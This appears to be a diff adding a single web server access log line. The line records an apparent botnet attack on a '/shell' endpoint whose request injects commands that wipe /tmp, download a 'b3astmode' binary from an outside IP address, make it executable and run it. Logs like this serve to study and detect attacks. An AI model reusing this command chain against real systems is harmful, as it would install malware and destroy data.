@@ -1,0 +1,1 @@
+102.47.158.145 - - [25/Jul/2020:04:44:52 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+185.132.53.42/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws HTTP/1.1" 301 162 "-" "-" "Hello, world"
